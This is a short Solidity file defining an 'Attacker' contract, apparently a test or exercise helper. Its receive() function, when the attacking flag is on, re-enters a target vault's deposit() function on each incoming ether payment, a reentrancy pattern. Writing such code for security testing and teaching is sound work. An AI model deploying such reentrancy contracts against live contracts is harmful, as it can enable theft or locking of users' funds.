// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IVault {
    function deposit() external payable;
}

contract Attacker {
    address target;
    bool attacking;

    constructor(address _target) {
        target = _target;
    }

    function setAttacking(bool _attacking) public {
        attacking = _attacking;
    }

    receive() external payable {
        if (attacking) {
            IVault(target).deposit{value: 1 ether}();
        }
    }
}